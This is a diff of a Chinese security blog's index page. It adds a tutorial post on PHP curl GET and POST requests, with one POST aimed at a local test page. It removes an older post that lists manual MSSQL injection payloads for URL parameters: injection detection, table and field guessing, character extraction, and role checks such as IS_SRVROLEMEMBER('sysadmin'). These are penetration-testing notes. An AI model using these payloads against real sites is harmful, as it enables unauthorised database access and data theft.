@@ -258,6 +258,267 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/24/php-curl方法总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/24/php-curl方法总结/" itemprop="url">
+                  php curl方法总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-24T21:57:04+08:00">
+                2018-05-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index">
+                    <span itemprop="name">php</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/24/php-curl方法总结/" class="leancloud_visitors" data-flag-title="php curl方法总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>做web安全的同时也需要优秀的开发能力，所以最近想提升一下自己python和php的开发能力，对一些经常用的方法做一个总结，当作笔记。</p>
+<p>curl方法在总结ssrf漏洞时用过，但是我当时没有做详细的说明，就放在这里总结一下。</p>
+<h2 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h2><p>PHP的libcurl库用来与各种的服务器使用各种类型的协议进行连接和通讯。</p>
+<p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</p>
+<p>PHP中使用cURL实现Get和Post请求的方法。</p>
+<p>百度百科用一句话总结了curl的能力： </p>
+<ul>
+<li>php curl就是php中的数据传输神器。</li>
+</ul>
+<h2 id="0x01-基本方法"><a href="#0x01-基本方法" class="headerlink" title="0x01 基本方法"></a>0x01 基本方法</h2><p>可以看到php curl库中封装的方法特别多，但我们平时用curl请求，大多数情况要做的的基本步骤有如下四步：</p>
+<h4 id="①：初始化"><a href="#①：初始化" class="headerlink" title="①：初始化"></a>①：初始化</h4><p>curl_init()</p>
+<p>初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close() 函数使用。</p>
+<p>用法：</p>
+<ul>
+<li>curl_init(url)</li>
+</ul>
+<p>参数：</p>
+<ul>
+<li>url：如果提供了该参数，CURLOPT_URL 选项将会被设置成这个值。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>如果成功，返回一个cURL句柄，出错返回 FALSE。</li>
+</ul>
+<h4 id="②：设置属性"><a href="#②：设置属性" class="headerlink" title="②：设置属性"></a>②：设置属性</h4><p>curl_setopt()</p>
+<p>为给定的cURL会话句柄设置一个选项。</p>
+<p>用法：</p>
+<ul>
+<li>curl_setopt ( resource $ch , int $option , mixed $value )</li>
+</ul>
+<p>参数：</p>
+<ul>
+<li>ch： 由 curl_init() 返回的 cURL 句柄。</li>
+<li>option： 需要设置的CURLOPT_XXX选项。</li>
+<li>value：将设置在option选项上的值。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>成功时返回 TRUE， 或者在失败时返回 FALSE。</li>
+</ul>
+<h4 id="③：执行并获取结果"><a href="#③：执行并获取结果" class="headerlink" title="③：执行并获取结果"></a>③：执行并获取结果</h4><p>curl_exec()</p>
+<p>执行给定的cURL会话。</p>
+<p>用法：</p>
+<ul>
+<li>curl_exec ( resource $ch )</li>
+</ul>
+<p>参数：</p>
+<ul>
+<li>ch： 由 curl_init() 返回的 cURL 句柄。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</li>
+</ul>
+<h4 id="④：释放句柄"><a href="#④：释放句柄" class="headerlink" title="④：释放句柄"></a>④：释放句柄</h4><p>curl_close()</p>
+<p>关闭一个cURL会话并且释放所有资源。cURL句柄ch 也会被释放。</p>
+<p>用法：</p>
+<ul>
+<li>curl_close ( resource $ch )</li>
+</ul>
+<p>参数：</p>
+<ul>
+<li>ch： 由 curl_init() 返回的 cURL 句柄。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>无</li>
+</ul>
+<h2 id="0x02-get请求"><a href="#0x02-get请求" class="headerlink" title="0x02 get请求"></a>0x02 get请求</h2><p>get请求是http请求中最基本的请求，一个普通的get请求只需初始化后，配置好url和一定量的参数，然后执行即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, &apos;http://www.baidu.com&apos;);</span><br><span class="line">//设置头文件的信息作为数据流输出</span><br><span class="line">//curl_setopt($curl, CURLOPT_HEADER, 1);</span><br><span class="line">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, 0);</span><br><span class="line">//执行命令</span><br><span class="line">$data = curl_exec($curl);</span><br><span class="line">//关闭URL请求</span><br><span class="line">curl_close($curl);</span><br><span class="line">//显示获得的数据</span><br><span class="line">//print_r($data);</span><br><span class="line">var_dump($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，设置CURLOPT_RETURNTRANSFER为0，使用php请求百度页面，结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, &apos;http://www.baidu.com&apos;);</span><br><span class="line">//设置头文件的信息作为数据流输出</span><br><span class="line">//curl_setopt($curl, CURLOPT_HEADER, 1);</span><br><span class="line">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">//执行命令</span><br><span class="line">$data = curl_exec($curl);</span><br><span class="line">//关闭URL请求</span><br><span class="line">curl_close($curl);</span><br><span class="line">//显示获得的数据</span><br><span class="line">//print_r($data);</span><br><span class="line">var_dump($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果设置CURLOPT_RETURNTRANSFER为1,则不会将获取的页面直接输出在页面内，结果如下：</p>
+<h2 id="0x03-post请求"><a href="#0x03-post请求" class="headerlink" title="0x03 post请求"></a>0x03 post请求</h2><p>post请求也是http请求中很重要的一种，既然是post请求，肯定要额外设置要post的数据才行，curl中需要配置CURLOPT_POST为1代表本次请求是post类型，然后再将要请求的数据通过CURLOPT_POSTFIELDS配置进本次请求，然后执行就可以提交post请求。</p>
+<p>这里我们用上一篇有关iframe框架钓鱼的留言界面进行测试，我们将留言的昵称和内容设置好，通过php curl方法请求。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl,CURLOPT_URL,&quot;http://127.0.0.1/curl/xss.php&quot;);</span><br><span class="line">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">//设置请求模式为post型</span><br><span class="line">curl_setopt($curl, CURLOPT_POST, 1);</span><br><span class="line">//配置post的数据</span><br><span class="line">$post_data = array(</span><br><span class="line">	&quot;name&quot; =&gt; &quot;curl_test&quot;,</span><br><span class="line">	&quot;message&quot; =&gt; &quot;heyheyhey&quot;</span><br><span class="line">);</span><br><span class="line">//全部数据使用HTTP协议中的&quot;POST&quot;操作来发送。</span><br><span class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">//执行请求</span><br><span class="line">$data = curl_exec($curl);</span><br><span class="line">//关闭请求</span><br><span class="line">curl_close($curl);</span><br><span class="line">//显示数据</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>根据返回的页面，发现这条留言已经被写入。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>在需要使用php获取页面内容时，其实可以通过更加简单的file_get_contents()函数，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=file_get_contents(&quot;http://www.baidu.com&quot;);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是学习curl是非常有必要的，curl虽然配置的参数更繁杂，但是相对应的支持的操作也就更多，比如cookies、验证、表单提交、文件上传等等，需要更加细致的操作时，就应该选用curl。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/21/分析并复现一次iframe框架钓鱼行为/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2189,227 +2450,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/MSSQL注入总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/03/MSSQL注入总结/" itemprop="url">
-                  MSSQL注入总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T15:29:52+08:00">
-                2018-05-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/03/MSSQL注入总结/" class="leancloud_visitors" data-flag-title="MSSQL注入总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前所有的sql注入类型的博客都以mysql数据库为例子的，但是在最近实际的渗透测试中有时会遇到一些MSSQL的数据库，所以对MSSQL注入进行一次总结。</p>
-<h2 id="0x01-MSSQL"><a href="#0x01-MSSQL" class="headerlink" title="0x01 MSSQL"></a>0x01 MSSQL</h2><p>ms SQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。</p>
-<h2 id="0x02-MSSQL手工注入技巧"><a href="#0x02-MSSQL手工注入技巧" class="headerlink" title="0x02 MSSQL手工注入技巧"></a>0x02 MSSQL手工注入技巧</h2><h4 id="1-判断是否有注入"><a href="#1-判断是否有注入" class="headerlink" title="1.判断是否有注入"></a>1.判断是否有注入</h4><ul>
-<li>?id=1</li>
-<li>?id=1’</li>
-<li>?id=1 and 1=1</li>
-<li>?id=1 and 1=2</li>
-</ul>
-<h4 id="2-判断是否是mssql"><a href="#2-判断是否是mssql" class="headerlink" title="2.判断是否是mssql"></a>2.判断是否是mssql</h4><ul>
-<li>?id=1 and user&gt;0</li>
-</ul>
-<h4 id="3-判断数据库系统"><a href="#3-判断数据库系统" class="headerlink" title="3.判断数据库系统"></a>3.判断数据库系统</h4><ul>
-<li>?id=1 and (select count(*) from sysobjects)&gt;0　　 mssql</li>
-<li>?id=1 and (select count(*) from msysobjects)&gt;0　　access</li>
-</ul>
-<h4 id="4-查询当前用户数据信息"><a href="#4-查询当前用户数据信息" class="headerlink" title="4.查询当前用户数据信息"></a>4.查询当前用户数据信息</h4><ul>
-<li>?id=1 having 1=1–</li>
-</ul>
-<h4 id="5-猜表名"><a href="#5-猜表名" class="headerlink" title="5.猜表名"></a>5.猜表名</h4><ul>
-<li>?id=1 and exists(select * from tablename)</li>
-<li>?id=1 and (Select Count(*) from [表名])&gt;0</li>
-</ul>
-<h4 id="6-猜字段"><a href="#6-猜字段" class="headerlink" title="6.猜字段"></a>6.猜字段</h4><ul>
-<li>?id=1 and (Select Count(字段名) from 表名)&gt;0</li>
-</ul>
-<h4 id="7-暴当前表中的列"><a href="#7-暴当前表中的列" class="headerlink" title="7.暴当前表中的列"></a>7.暴当前表中的列</h4><ul>
-<li>?id=1 group by admin.username having 1=1–</li>
-</ul>
-<h4 id="8-猜字段中记录长度"><a href="#8-猜字段中记录长度" class="headerlink" title="8.猜字段中记录长度"></a>8.猜字段中记录长度</h4><ul>
-<li>?id=1 and (select top 1 len(字段名) from 表名)&gt;0</li>
-</ul>
-<h4 id="9-猜字段中的ascii值"><a href="#9-猜字段中的ascii值" class="headerlink" title="9.猜字段中的ascii值"></a>9.猜字段中的ascii值</h4><ul>
-<li>?id=1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0   access</li>
-<li>?id=1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0   mssql</li>
-</ul>
-<h4 id="10-测试权限结构（mssql）"><a href="#10-测试权限结构（mssql）" class="headerlink" title="10.测试权限结构（mssql）"></a>10.测试权限结构（mssql）</h4><ul>
-<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–</li>
-<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–</li>
-<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–</li>
-<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–</li>
-<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–</li>
-<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–</li>
-<li>?id=1 and 1=(SELECT IS_MEMBER(‘db_owner’));–</li>
-</ul>
-<h4 id="11-mssql内置函数"><a href="#11-mssql内置函数" class="headerlink" title="11.mssql内置函数"></a>11.mssql内置函数</h4><ul>
-<li>?id=1 and (select @@version)&gt;0　　　获得Windows的版本号</li>
-<li>?id=1 and user_name()=’dbo’　　　　 判断当前系统的连接用户是不是sa</li>
-<li>?id=1 and (select user_name())&gt;0　　爆当前系统的连接用户</li>
-<li>?id=1 and (select db_name())&gt;0　　　得到当前连接的数据库</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2459,7 +2499,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">94</span>
+                <span class="site-state-item-count">95</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2470,7 +2510,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-count">24</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2481,7 +2521,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">60</span>
+                <span class="site-state-item-count">61</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
